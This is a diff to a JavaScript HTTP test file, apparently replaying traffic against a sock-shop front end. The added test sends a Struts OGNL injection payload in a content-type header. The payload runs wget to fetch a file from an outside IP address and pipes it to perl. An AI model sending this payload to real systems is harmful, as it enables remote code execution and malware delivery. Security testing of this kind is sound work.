@@ -538,6 +538,27 @@ it("test_316_get_", () => {
     });
 });
 
+it("test_317_get_", () => {
+    clearSession();
+
+    // GET http://front-end.sock-shop/ (endp 317)
+    const front_end_sock_shop = getHttpClient("http://front-end.sock-shop", authenticate);
+    return front_end_sock_shop.fetch("/", {
+        headers: {
+            "content-type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl"
+        }
+    })
+    .then((response) => {
+        expect(response.status).toEqual(200);
+        return response.text();
+    })
+    .then((text) => {
+        expect(CSSselect("div#hot div.box div.container div h2", text)).toContain("Hot this week");
+    })
+    .then((data) => {
+    });
+});
+
 describe.each(dataset("data/dataset_55.json"))("test_055_get_param", (param) => {
     it("test_055_get_param", () => {
         clearSession();
